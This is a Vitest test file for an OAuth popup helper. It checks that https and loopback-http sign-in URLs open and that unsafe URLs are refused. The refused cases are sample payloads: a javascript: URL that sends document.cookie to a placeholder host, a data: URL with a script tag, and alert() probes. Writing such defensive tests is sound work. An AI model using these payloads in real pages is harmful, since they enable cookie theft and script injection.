import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const mocks = vi.hoisted(() => ({
  tauri: false,
  openExternalUrl: vi.fn(),
}));
vi.mock('@core/util/platform', () => ({ isTauri: () => mocks.tauri }));
vi.mock('@core/util/url', () => ({ openExternalUrl: mocks.openExternalUrl }));

import { assignOauthUrl } from './oauth-popup';

function popup() {
  return { closed: false, close: vi.fn(), location: { href: 'about:blank' } };
}

beforeEach(() => {
  vi.clearAllMocks();
  mocks.tauri = false;
});
afterEach(() => vi.restoreAllMocks());

describe('assignOauthUrl', () => {
  it('opens an https sign-in page in the reserved tab', () => {
    const tab = popup();

    const opened = assignOauthUrl(
      tab as unknown as Window,
      'https://auth.example.com/authorize?state=s'
    );

    expect(opened).toBe(true);
    expect(tab.location.href).toBe('https://auth.example.com/authorize?state=s');
    expect(tab.close).not.toHaveBeenCalled();
  });

  it('opens http only on a loopback host, for a local server', () => {
    const tab = popup();

    expect(
      assignOauthUrl(tab as unknown as Window, 'http://127.0.0.1:8790/authorize')
    ).toBe(true);
    expect(tab.location.href).toBe('http://127.0.0.1:8790/authorize');
  });

  it.each([
    ["javascript:fetch('//x/'+document.cookie)//?state=s"],
    ['data:text/html,<script>alert(1)</script>'],
    ['http://auth.example.com/authorize'],
    ['not a url'],
  ])('refuses %s and closes the reserved tab', (url) => {
    const tab = popup();

    expect(assignOauthUrl(tab as unknown as Window, url)).toBe(false);
    expect(tab.location.href).toBe('about:blank');
    expect(tab.close).toHaveBeenCalled();
  });

  it('refuses an unsafe URL in the system browser too', () => {
    mocks.tauri = true;

    expect(assignOauthUrl(null, 'javascript:alert(1)')).toBe(false);
    expect(mocks.openExternalUrl).not.toHaveBeenCalled();
  });

  it('opens a safe URL in the system browser when no tab was reserved', () => {
    expect(assignOauthUrl(null, 'https://auth.example.com/authorize')).toBe(true);
    expect(mocks.openExternalUrl).toHaveBeenCalledWith(
      'https://auth.example.com/authorize'
    );
  });
});
